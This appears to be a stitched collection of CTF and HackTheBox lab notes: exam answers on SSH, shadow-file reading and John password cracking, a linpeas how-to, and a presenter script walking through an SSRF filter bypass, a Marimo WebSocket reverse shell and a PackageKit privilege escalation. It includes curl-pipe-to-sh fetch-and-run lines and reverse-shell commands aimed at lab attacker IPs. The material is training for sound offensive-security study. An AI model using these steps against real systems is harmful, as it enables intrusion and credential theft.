shujaa{smb_sh4r3_3numer4t3d}
```

11. What is the exposed username and password? (1 mk)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat creds.txt
username: examuser
password: Cyb3rShuj44!
```

12. SSH into the machine and retrieve the flag in the user’s home directory. (2 mks)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ssh examuser@4.180.20.166
examuser@4.180.20.166's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.0-1008-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar  7 10:41:02 UTC 2026

  System load:  0.13              Processes:             134
  Usage of /:   9.1% of 28.02GB   Users logged in:       0
  Memory usage: 4%                IPv4 address for eth0: 172.16.0.4
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Mar  7 10:41:03 2026 from 102.216.86.189
examuser@midexam:~$ ls
checkflag  checkifcompressed  flag.txt  grepme.txt
examuser@midexam:~$ cat flag.txt 
shujaa{w3lc0m3_t0_ssh_acc3ss}
```

13. In the user's home directory what is the name of the first hidden file owned by root. (1 mk)

```shell
/home/examuser
examuser@midexam:~$ ls -la
total 56
drwxr-x--- 2 examuser examuser  4096 Mar  7 10:44 .
drwxr-xr-x 5 root     root      4096 Feb 26 09:40 ..
-r--r--r-- 1 root     root        33 Feb 26 09:41 .encoded
---x--x--x 1 root     root     16328 Feb 26 09:41 checkflag
---x--x--x 1 root     root     16216 Feb 26 09:41 checkifcompressed
-r--r--r-- 1 root     root        30 Feb 26 09:41 flag.txt
-r--r--r-- 1 root     root      6700 Feb 26 09:41 grepme.txt
```

14. Retrieve the flag by decoding the contents of the file you found above. **NB only use the terminal to solve this task** (2mks)

```shell
examuser@midexam:~$ cat .encoded
c2h1amFhezY0X2QzYzBkM2RfZmw0Z30=
examuser@midexam:~$ cat .encoded | base64 -d
shujaa{64_d3c0d3d_fl4g}examuser@midexam:~$ 
```

15. Using grep, retrieve a flag hidden in the grepme.txt within the user's home directory (2 mks)

```shell
examuser@midexam:~$ grep "shujaa" grepme.txt 
shujaa{gr3p_m4st3r_f0und_m3}
```

16. Create a file with the content cybershujaa_exam, save the file, run the binary (checkflag) against your file and retrieve the flag. (3 mks)

```shell
examuser@midexam:~$ vi file.txt
examuser@midexam:~$ cat file.txt 
cybershujaa_exam
examuser@midexam:~$ ./checkflag file.txt 
RESULT: shujaa{ch3ck_f1l3_c0nt3nt_succ3ss}\nexamuser@midexam:~$ 
```

17. Create a NEW file called "compressed.txt" with the content "zipmaster2024", compress it then run the binary in the user's home directory called "checkifcompressed" giving the name of your zip file as an argument. What is the flag? (3 mks)

```shell
examuser@midexam:~$ echo "zipmaster2024" > compressed.txt ; zip compressed.zip compressed.txt ; ./checkifcompressed compressed.zip
  adding: compressed.txt (stored 0%)
RESULT: shujaa{z1p_m4st3r_c0mpl3t3d}\nexamuser@midexam:~$ 
```

18. A misconfiguration is on the shadow file allowing users to read its contents. Retrieve both the password file passwd and the shadow file. (2 mks)

```shell
examuser@midexam:~$ cat /etc/shadow
root:*:20483:0:99999:7:::
daemon:*:20483:0:99999:7:::
bin:*:20483:0:99999:7:::
sys:*:20483:0:99999:7:::
sync:*:20483:0:99999:7:::
games:*:20483:0:99999:7:::
man:*:20483:0:99999:7:::
lp:*:20483:0:99999:7:::
mail:*:20483:0:99999:7:::
news:*:20483:0:99999:7:::
uucp:*:20483:0:99999:7:::
proxy:*:20483:0:99999:7:::
www-data:*:20483:0:99999:7:::
backup:*:20483:0:99999:7:::
list:*:20483:0:99999:7:::
irc:*:20483:0:99999:7:::
_apt:*:20483:0:99999:7:::
nobody:*:20483:0:99999:7:::
systemd-network:!*:20483::::::
systemd-timesync:!*:20483::::::
dhcpcd:!:20483::::::
messagebus:!:20483::::::
syslog:!:20483::::::
systemd-resolve:!*:20483::::::
uuidd:!:20483::::::
tss:!:20483::::::
sshd:!:20483::::::
pollinate:!:20483::::::
tcpdump:!:20483::::::
landscape:!:20483::::::
fwupd-refresh:!*:20483::::::
polkitd:!*:20483::::::
_chrony:!:20483::::::
azureuser:!:20510:0:99999:7:::
examuser:$y$j9T$ojp.We/iGt3o871xOUMVH/$gUDhgM5LwENmKQI1gjvGFRW0FU2Rp9tP1gC2Q0.pAU/:20510:0:99999:7:::
examadmin:$y$j9T$TN4OaS/VTu1SaKDNlcwPA1$47G8q5/TJG0HOnXiCvRPuMyG/kki58ctxZs2Pbjnfc2:20510:0:99999:7:::
```

```shell
examuser@midexam:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
_chrony:x:109:113:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
azureuser:x:1000:1000:Ubuntu:/home/azureuser:/bin/bash
examuser:x:1001:1001::/home/examuser:/bin/bash
examadmin:x:1002:1002::/home/examadmin:/bin/bash
examuser@midexam:~$ 
```

19. Unshadow and crack using John. What is the examadmin password? Use the provided wordlist. (2 mks) HINT: use the format –format=crypt

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unshadow passwd shadow > crackme.txt ; john --format=crypt --wordlist=Wordlist.txt crackme.txt
Warning: hash encoding string length 18, type id #0
appears to be unsupported on this system; will not load such hashes.
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shujaa2024       (examadmin)     
1g 0:00:00:25 DONE (2026-03-07 07:36) 0.03849g/s 155.6p/s 159.3c/s 159.3C/s multi..like
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

20. Retrieve the  flag.txt from the examadmin user’s home directory. (2 mks)

```shell
examuser@midexam:~$ su examadmin
Password: 
examadmin@midexam:/home/examuser$ ls
ls: cannot open directory '.': Permission denied
examadmin@midexam:/home/examuser$ cd 
examadmin@midexam:~$ ls
flag.txt
examadmin@midexam:~$ cat flag.txt
shujaa{r00t_pr1v_3sc4l4t10n_m4st3r}
examadmin@midexam:~$ 
```

---

## Random


## Standard PrivEsc Enumeration

|                            |                                      |                                                |
| -------------------------- | ------------------------------------ | ---------------------------------------------- |
| First checks (quick wins)  | can we run anything as root?         | `sudo -l`                                      |
|                            | what groups are we in?               | `id`                                           |
|                            | scheduled jobs running as root?      | `cat /etc/crontab `                            |
| SUID/GUID binaries         | files that run as their owner        | `find / -perm -4000 2>/dev/null `              |
| Running processes          | spot unusual root processes          | `ps aux`                                       |
| Writable files/directories |                                      | `find / -writable 2>/dev/null \| grep -v proc` |
| Automated tools:           | covers all of the above and more<br> | `./linpeas.sh `                                |



how can I run /.linpeas.sh

First you need to get the script onto the target. A few ways:

Option 1 — host it from Kali and wget/curl it on the target:

On Kali:
download linpeas if you don't have it
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

host it
python3 -m http.server 8080

On the target (via your reverse shell):
cd /tmp
wget http://10.10.14.85:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Option 2 — run it directly without writing to disk:
curl http://10.10.14.85:8080/linpeas.sh | sh

Option 3 — via your rce script (no shell yet):
python3 rce3.py "curl http://10.10.14.85:8080/linpeas.sh | sh"

Note: LinPEAS produces a lot of output. If you're running it through rce3.py the 5 second timeout will cut it off. It works best inside an interactive reverse shell where you can scroll through the full output — the interesting findings are color coded in red/yellow.





-----------------
# Cohort — Live Walkthrough

## Presenter Talk-Track / Speaking Script

_HackTheBox · Web → Linux privilege escalation_

---

**How to use this script.** Read the plain paragraphs aloud — they're written to be spoken, not summarised. Lines in _[ square brackets ]_ are stage directions: things you _do_ on screen, not things you say. Fenced code blocks are the exact commands to type. Blockquoted **presenter notes** are reminders for you — don't read them out.

> **Framing note:** Two claimed CVEs in this box (the Marimo RCE and the PackageKit escalation) are dated 2026. Present them as "reported as" and point the audience at the advisory rather than asserting the detail as settled fact. It keeps you honest if someone in the room knows the specifics.

---

## 0 · Opening — set the scene

Welcome to this week's CTF Walkthrough session. 

Today we're going end to end on a box called Cohort machine 11 from sn 11. 

This is a **web box first** — everything that gets us onto the machine happens through a browser and a web request. Only at the very end does it turn into a Linux privilege-escalation problem, and that part happens on the same machine we already landed on, so there's no pivoting between hosts to worry about.

There's **a server that fetches a URL for you and with that capability you can aim at things it can reach and you can't.** Hold onto that thought we'll get to see it action soon. Everything in the first half is a consequence of it.

As usual I'll narrate what I'm doing as I go. Stop me with questions at any point — this is a walkthrough that is meant to be followed, not just watched so I hope you've got your terminal ready. Let's start where every engagement on htb starts

---

## 1 · Recon — what is this thing?

### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.

### 1.1 Confirm it's alive

First I just check the box is up and reachable. If I skip this and go straight to the nmap scan and it fails, I won't know whether the scan is wrong or the host is down. Cheap insurance.

_[ type in terminal ]_

I'm putting the address in a variable called `IP` so I never have to retype it

```bash
IP=10.129.121.70
ping -c 4 $IP
```


### 1.2 Scan every port

Now I scan all ports. Most people scan the default top thousand and move on — but you could miss out on some interesting services. they love to hide on odd port numbers, so I look at everything the first time.

_[ type in terminal ]_

```bash
nmap -p- --min-rate 5000 -Pn $IP
```

While that runs, let me tell you what the flags mean so nobody's lost. `-p-` means all ports. `--min-rate 5000` forces it to send five thousand packets a second so we're not here all day. And `-Pn` tells nmap "don't bother pinging first, I already know it's up" — which we do, from the last step.

_[ results appear — point at the screen ]_

Here's the result, with Three ports come back clearly open — twenty-two, eighty, four-four-three. 

> Then there's a whole pile of ports marked _filtered_ with random high numbers. **Those are not real.** See that warning line at the top about 'retransmission cap hit'? That's nmap telling us it gave up waiting on some packets.
> 
> Here's why. Over a slow link like this one, firing five thousand packets a second means some get dropped. When nmap sends a probe and hears nothing back, it can't tell the difference between 'a firewall silently ate it' and 'the network lost it' — so it labels both _filtered_. The random scatter of those port numbers is the giveaway. Real filtered ports cluster; noise is spread all over. So: **three ports are open, everything else is an artifact.**
> 
### 1.3 Fingerprint the three real ports

A port number tells you a convention, not a product. Port eighty is 'probably a web server' — but which one, what version, configured how? So I will run a deeper scan on just those three, and let nmap take its time with this scan coz it's heavier than the first which is pretty superficial.

_[ type in terminal ]_

```bash
nmap -A -p 22,80,443 $IP
```

_[ results appear — walk the audience through them ]_

Twenty-two is SSH, current version, nothing we can kick down without a key. Eighty is nginx, and it just redirects everything to HTTPS. Four-four-three is the real web server.

And here's the line that quietly decides the whole first half of this box. Look at the TLS certificate — its 'Subject Alternative Name' lists `cohort.htb` and **`*.cohort.htb`**. That asterisk is called a wildcard. It means whoever set this up planned to serve **subdomains they haven't seen yet** — the web server is routing different names to different applications behind the scenes. File that away. We will come back for it.

> **If asked why the wildcard matters now:** Because it's the reason a service we can't reach directly becomes reachable later. Don't over-explain it here — just plant the flag and move on. The payoff lands in section 3.7.

---

## 2 · Enumeration — read the application

### 2.1 Fix name resolution, then read the site

The box answers to names, not numbers, so my machine needs to know that `cohort.htb` means this IP. I add one line to my hosts file.

_[ type in terminal ]_

```bash
echo "$IP  cohort.htb" | sudo tee -a /etc/hosts
```

Now I open the site in a browser. 

Site branding: **Cohort Analytics**, a subscription-retention analytics consultancy. Page sections: Services, Approach, Results, Team.

Navigation and calls to action:

|Element|Location|Destination|
|---|---|---|
|Services / Approach / Results / Team|Header nav|In-page anchors on the landing page|
|Client Insights|Header, top right|Separate application (repeated as a CTA)|
|Open Client Insights|Hero section, and footer CTA block|Same destination as above|
|How we work|Hero section|In-page anchor|

Service descriptions listed under "What we do":

| No. | Service                        | Description as published                           | Relevance                                             |
| --- | ------------------------------ | -------------------------------------------------- | ----------------------------------------------------- |
| 01  | Cohort and retention modelling | Rebuilds retention curves from raw events          | Data processing; no user-supplied endpoint implied    |
| 02  | Churn forecasting              | Survival models scored against revenue             | No external input implied                             |
| 03  | Activation analytics           | Traces first-30-day paths                          | No external input implied                             |
| 04  | Reporting that gets read       | Dashboards refreshed on a schedule                 | Implies scheduled server-side jobs                    |
| 05  | **Source review**              | **Validates every feed the client points them at** | **Server fetches a client-nominated remote resource** |

Process steps published under "We work in the open":

- **A** - Connect a warehouse or a read-only export, and agree what a retained account means.
- **B** - Reconcile the raw feed against billing.
- **C** - Model, review together, and hand back the notebook.

**What this gives you:**

**Key finding: service 05 and process step A both describe the server retrieving a resource at a URL the client supplies.** Phrases such as "every feed you point us at" and "connect your warehouse" describe outbound server-initiated requests driven by user-controlled input. Where an application fetches an address chosen by an untrusted party, the address may be redirected toward the server's own internal network rather than an external data source which is the precondition for Server-Side Request Forgery.

Supporting observations:

- The "Client Insights" call to action appears three times (header, hero, footer) and is the only element linking away from the landing page. This is the application proper; the landing page is static content.
- Process step C mentions handing back "the notebook," implying a notebook application exists somewhere in the environment.
- Named personnel: Mara Quinteros (Founder) and Devin Oyelaran (Analytics engineering). Retain as potential usernames.

**Ruled out:** The landing page itself as an attack surface. It exposes no input fields, no authentication, and no dynamic content.

Strip out the business language and both sentences say the same thing: **you give us a URL, and our server goes and fetches it.** That is the entire attack surface, and the website advertised it to us in plain English. Copy on a target is intelligence — the box author put it there to point us somewhere.

### 2.2 Discover the site is a JavaScript app

Before I click anything, I pull the raw page with curl to see its links. Watch what happens — the browser showed a rich page, but curl gets almost nothing.

_[ type in terminal ]_

```bash
curl -sk https://cohort.htb/ | head -20
```

Nine hundred bytes and an empty shell — a `div` that says 'Loading' and a note saying 'JavaScript required.' This is a single-page application. The server sends a near-empty skeleton, and the browser's JavaScript builds the actual page afterward. Curl doesn't run JavaScript, so it sees the skeleton.

Why do I care? Because the _routes_ — the paths and API endpoints this app uses — aren't in the HTML anymore. They've moved into a JavaScript file. And that file lists _every_ route the app knows, including ones with no visible button. So the JavaScript is a better map than the rendered page ever was.

### 2.3 The JavaScript is deliberately scrambled

So I pull the script file and look for paths in it.

_[ type in terminal ]_

```bash
curl -sk https://cohort.htb/assets/app.js -o app.js
head -c 400 app.js
```

And it's gibberish — variable names like `_0x25ef22`, numbers written in hexadecimal, every string replaced by a function call that decodes it at runtime. This is obfuscation. The text '/portal' doesn't exist anywhere in this file as readable characters — it's encrypted and only reassembled when the code runs.

So grepping for paths is hopeless. But here's the key move: **obfuscation hides code from a human reader, not from the browser that has to run it.** When static analysis is blocked, we go dynamic — we let the app run and watch what it asks for.

### 2.4 Watch the app run and find the real page

I open the browser's developer tools, go to the Network tab, reload, and click the 'Client Insights' button. The Network tab records every request the app makes — and it shows the real URL, no matter how scrambled it was in the source.

_[ click Client Insights, point at the Network panel ]_

There it is: a page called `portal.html` titled 'Register a report source URL.' A form with a URL box, a format dropdown, and a 'Validate source' button. And read the Notes on that page: 'internal and loopback addresses are rejected.' That's the app telling us it fetches URLs _and_ that it has a filter. Both facts matter.

> **If a stray 'config.json' shows up in the Network tab:** It's a browser-extension artifact (`chrome-extension://` scheme), not the target. Good moment to mention: do web enumeration in a clean browser profile with no extensions, or you'll chase ghosts. I did exactly that on my first run of this box.

---

## 3 · Exploitation — the SSRF chain

### 3.1 Prove the server fetches our URL

The page claims it fetches URLs. I don't take that on faith — I make it prove it against a listener I control. I start a tiny web server on my own machine:

_[ terminal one ]_

```bash
python3 -m http.server 8000
```

Then in the form's URL box I put my own address — `http://10.10.15.77:8000/ssrf-test` — and hit validate.

_[ point at the listener terminal ]_

And there — a request just hit my server, and look at the source address: it's the **target's** IP, not my browser's. That's the whole ballgame. The server made a request on my behalf, to an address I chose. That's Server-Side Request Forgery — SSRF.

Even better: the page shows me the full response it got back — status code, content type, body. That makes this a _read_ SSRF, the most useful kind. The server isn't just fetching for me, it's **reading things back to me**. It's become a web browser I can point inside their network.

> **The building analogy (use it, it lands):** Picture the server as an office. From the street you see reception and nothing else. But reception offers to dial any extension and read you the conversation. Give them an internal extension and they'll happily read you things you were never meant to hear. SSRF is using reception's phone as your own.

### 3.2 Test the filter

The Notes said loopback is blocked. Let me test that claim directly by asking for `127.0.0.1` — the address that always means 'this machine.'

_[ submit http://127.0.0.1:80/ in the form ]_

Blocked — 'internal or loopback addresses are not permitted,' and it comes back _instantly_, with no status code and no body. That speed tells me something: the server never actually made a request. It looked at my text, matched it against a banned list, and refused before dialling. That's a **blocklist**, and blocklists have a fatal weakness.

### 3.3 Beat the filter with a different spelling

Here's the weakness. The filter checks the _text_ I typed. But the network doesn't connect using text — it connects using a number. And `127.0.0.1` is just a human-friendly way of writing a single 32-bit number: **`2130706433`**. Same destination, completely different spelling.

So the filter, which is looking for the text one-two-seven-dot-zero-dot-zero-dot-one, never sees it. But the network stack takes my number and connects to loopback anyway. Watch.

_[ submit http://2130706433:80/ in the form ]_

There it is — 'Reachable, HTTP 200,' and it hands me back the target's own web page, fetched from _inside_ the box. The address the filter refused ten seconds ago, I just reached by writing it differently. **Validate after you resolve an address, never before** — that's the lesson, and it's why blocklists lose.

### 3.4 Look inside — find the hidden service

Now I have a browser inside their network. Remember from the port scan — externally only three ports were open. But services bound to 'loopback' only accept connections from the machine itself, so they're invisible to any outside scan. **The SSRF lets me knock on those doors.**

The website mentioned handing back 'the notebook,' and notebook servers famously run on port 8888. So I try it.

_[ submit http://2130706433:8888/ in the form ]_

And there's our target: a login page titled **marimo**. Marimo is a notebook server — think of it as a tool that exists specifically to run code you type into it. Completely invisible from outside, sitting right there once we're inside.

### 3.5 Script the SSRF so we can sweep

Clicking the form for every port is painful. I peek at what the form actually sends — it's a simple JSON request to an endpoint called /api/validate, with just a URL and a format. No password, no token. So I can replay it from the command line.

_[ type in terminal ]_

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/","format":"csv"}'
```

Same Marimo page comes back, now as clean JSON I can filter. Now sweeping thirty ports is a loop instead of thirty clicks.

_[ run the port-sweep loop (see cheat sheet at the end) ]_

The sweep confirms the map: nginx on eighty and four-four-three, a hidden JSON API on port 5000, and Marimo on 8888. **Two of those four were completely invisible to the outside world.** And notice the error messages differ — 'connection refused' means nothing's there, while a different error on port twenty-two means 'something's listening but it's not a web server.' The errors themselves are free reconnaissance.

### 3.6 Fingerprint Marimo's version

For a code-running notebook, the version decides everything, because the version decides which known weaknesses apply. I ask it directly.

_[ type in terminal ]_

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/api/version","format":"csv"}' | jq -r '.preview'
```

Version 0.20.4. That version is reported vulnerable to a pre-authentication remote-code-execution flaw — meaning code execution **without logging in** — through a WebSocket endpoint. Which brings us to a problem.

> **Honesty beat:** Say out loud that this CVE is dated 2026 and you're citing the advisory rather than vouching for it. Costs you nothing and buys credibility.

### 3.7 The problem, and the wildcard pays off

The flaw needs a WebSocket — a persistent, two-way connection. But my SSRF is one-shot: fetch a URL, read the answer, done. I can't hold a live connection open through it. So I've found the vulnerable service and still can't reach it in a way I can exploit.

Remember that wildcard certificate from the very first scan? This is where it pays off. If some subdomain routes to Marimo, I can connect to _that_ directly and the web server carries my connection through. I just need the name. Web servers often expose a status page to localhost only — so I ask for it through the SSRF.

_[ type in terminal ]_

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:80/status","format":"csv"}' | jq -r '.preview'
```

And nginx hands me its entire routing table. There's the name: **`nb-1be3782a8afd3ad5.cohort.htb`**, routing straight to Marimo. Look at that name — sixteen random hex characters. No wordlist would ever guess it. **Secrecy of the name was the only thing protecting it**, and a status page we reached through the SSRF just gave it away.

### 3.8 Connect directly to Marimo

I add that name to my hosts file and connect to it directly over HTTPS.

_[ type in terminal ]_

```bash
echo "$IP  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
```

Version comes straight back, no SSRF wrapper. I'm talking to Marimo directly now, through a real connection I can upgrade to a WebSocket. The obstacle from two steps ago is gone.

### 3.9 Confirm the endpoint is unauthenticated

The vulnerable path is `/terminal/ws`. I confirm it accepts a WebSocket upgrade — and critically, that it does so **without any credentials**. I send the handshake with curl.

_[ run the WebSocket handshake with curl (cheat sheet at the end) ]_

'101 Switching Protocols' — accepted. And watch this — the moment the connection opens, the server sends me a **shell prompt**: 'marimo@cohort'. It opened a terminal and greeted me, and I never logged in. That is the pre-auth flaw, confirmed with my own eyes, not taken on trust. Anyone who can reach this endpoint gets a shell.

### 3.10 Get a real shell

Curl proves the endpoint but can't drive a full session, so I use a small Python exploit script — the published proof-of-concept for this flaw. I've read it beforehand; it does exactly what it says and nothing sneaky. I start a listener, then fire the reverse shell.

_[ terminal one — listener ]_

```bash
nc -lvnp 4444
```

_[ terminal two — fire it ]_

```bash
python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell 10.10.15.77 4444
```

_[ point at the listener as the shell lands ]_

Connection back, live prompt. I run `id` — I'm the `marimo` user. Then a couple of commands to stabilise the terminal so arrow keys and tab completion work, and I grab the user flag from the home directory.

_[ type in shell ]_

```bash
cat /home/marimo/user.txt
```

There's our first flag. **That's the entire first half done** — a web form took us all the way to a shell. Pause here, take questions, because the character of the box changes completely now.

---

## 4 · Privilege escalation — from marimo to root

### 4.1 Check the obvious paths first

New goal: go from this limited user to root. I run the standard checklist, and I want the audience to see it come back empty, because the emptiness is itself a clue.

_[ type in shell ]_

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

Sudo wants a password we don't have. The special 'run-as-owner' programs are all the stock system ones — nothing custom to abuse. Scheduled tasks are all default. **Every usual door is locked.** On a box that clearly has a way to root, that tells me the path is something less obvious — a running service.

### 4.2 Read the process list

So I look at what's running and, crucially, who owns each thing.

_[ type in shell ]_

```bash
ps aux --sort=-%mem | head -40
```

A few things jump out. There's a hidden data API running as its own user — I read its source, and it's clean, a dead end, but worth ruling out. And there's a cluster of services running as **root** that all talk to each other over something called D-Bus — the system's internal messaging bus. One of them is PackageKit, which installs software packages on behalf of ordinary users. That family of tools has a long history of privilege-escalation bugs, and it leaves no trace in the usual places we just checked.

### 4.3 Confirm PackageKit is reachable

PackageKit doesn't show up as a running process, which trips people up. That's because it's started on demand — it sleeps until someone sends it a request, then the system wakes it up. So instead of looking for it, I poke it.

_[ type in shell ]_

```bash
pkcon backend-details 2>/dev/null
```

It answers, with details of its 'apt' backend. That response could only come from the daemon — so my request just woke it up, it runs as root, and I can reach it as a nobody user. **That's the privilege boundary we're going to cross.**

### 4.4 The exploit — a race condition

The flaw is a timing bug, and it's worth understanding before I fire it. PackageKit lets an ordinary user ask to install a package, and it's supposed to pop up an authentication prompt first — check permission, then act. The bug is that the _check_ and the _action_ aren't glued together.

The exploit sends two install requests almost on top of each other: one harmless 'just pretend' request, and one real request carrying a booby-trapped package. It **races** them so the real, malicious package gets processed under the permission granted to the pretend one. Win the race, and my package's install script runs as root. What it installs is dead simple — a copy of the bash shell with a special bit set that makes it run _as its owner_, which will be root.

> **Read the exploit before the talk:** The payload is one line — `install -m 4755 /bin/bash /tmp/.suid_bash`. If you can say that from memory and explain the 4755, the audience trusts you're not running mystery code. The repo also ships a prebuilt binary and .deb which the script does NOT use — mention you ignore those on principle.

### 4.5 Stage and run it

The target can't compile code and has no internet, but it does have Python with the right library. So I serve the script from my machine and pull just that one file — not the prebuilt binaries in the repo, which I don't trust and don't need.

_[ attacker machine — serve ]_

```bash
cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot
python3 -m http.server 8000
```

_[ target shell — fetch and verify it's the real script ]_

```bash
cd /tmp
curl -s http://10.10.15.77:8000/exploit.py -o exploit.py
head -5 exploit.py
```

> **Why the head check:** First time I ran this I served from the wrong folder, got a 404 saved as exploit.py, and Python choked on the HTML. The head check catches that instantly — you want to see `import os`, not `<!DOCTYPE HTML>`. Good honest moment to show live if it happens.

_[ target shell — fire it ]_

```bash
python3 /tmp/exploit.py
```

It builds the two packages, creates a transaction, fires the race, and polls. And there — 'SUCCESS, SUID bash is root.' The prompt just changed to end in a **`#`** instead of a dollar sign. That hash is the universal sign of a root shell. If it had timed out, by the way, I'd just run it again — it's a race, and first-try misses are normal, not failure.

### 4.6 Confirm root and grab the flag

_[ type in shell ]_

```bash
id
cat /root/root.txt
```

The `id` shows effective UID zero — root, for the purposes that matter. And reading root's flag file, which only root can read, proves it. **That's the box.** Full chain: a web form to root.

---

## 5 · Wrap-up — the story in one breath

Let me tie the whole thing together, because the individual tricks matter less than how they connected.

- A 'validate my report URL' feature let us make the server fetch addresses of our choosing — which is why we could then reach services that were invisible from outside.
- Its filter only blocked the spelling 127.0.0.1, so writing that address as a plain number walked straight past it — which is why we reached a notebook server bound to localhost.
- A status page, reachable only from inside, leaked the secret subdomain protecting that notebook — which is why we could connect to it directly and open a WebSocket.
- The notebook's terminal endpoint needed no login and handed us a shell — which is why a web bug became code execution on the host.
- Every ordinary escalation path was locked, which pointed us at the root-owned services — and a timing bug in PackageKit's installer handed us root.

And one honest note on category: I sold this as a web box with a Linux tail, and that held. The one step that _looks_ like service exploitation — the Marimo RCE — was really a web problem in disguise. Getting to it was all SSRF. The code execution itself was almost an afterthought once we had the connection.

The single sentence to take home: a server that fetches URLs for you can be aimed at everything it can reach and you can't. Everything today grew out of that one idea. Questions?

---

## Appendix · Command cheat sheet

_Keep this on a second screen. Every command in running order, IPs shown as placeholders — substitute the live values._

### Recon

```bash
IP=TARGET_IP
ping -c 4 $IP
nmap -p- --min-rate 5000 -Pn $IP
nmap -A -p 22,80,443 $IP
```

### Enumeration

```bash
echo "$IP  cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://cohort.htb/ | head -20
curl -sk https://cohort.htb/assets/app.js -o app.js
# then: browser DevTools > Network > click "Client Insights" > find portal.html
```

### SSRF confirm + filter bypass

```bash
# listener
python3 -m http.server 8000
# in the form: http://LHOST:8000/ssrf-test   (confirms outbound fetch)
# in the form: http://127.0.0.1:80/           (blocked)
# in the form: http://2130706433:80/          (bypass — works)
```

### Scripted SSRF + port sweep

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/","format":"csv"}'

for p in 22 80 443 3000 5000 5432 6379 8000 8080 8081 8888 9000 9090 9200 11211 27017; do
  r=$(curl -sk -X POST https://cohort.htb/api/validate \
        -H 'Content-Type: application/json' \
        -d "{\"url\":\"http://2130706433:$p/\",\"format\":\"csv\"}")
  echo "$p -> $(echo "$r" | head -c 120)"
done
```

### Fingerprint + recover vhost

```bash
curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:8888/api/version","format":"csv"}' | jq -r '.preview'

curl -sk -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://2130706433:80/status","format":"csv"}' | jq -r '.preview'

echo "$IP  nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
curl -sk https://nb-1be3782a8afd3ad5.cohort.htb/api/version
```

### WebSocket handshake check

```bash
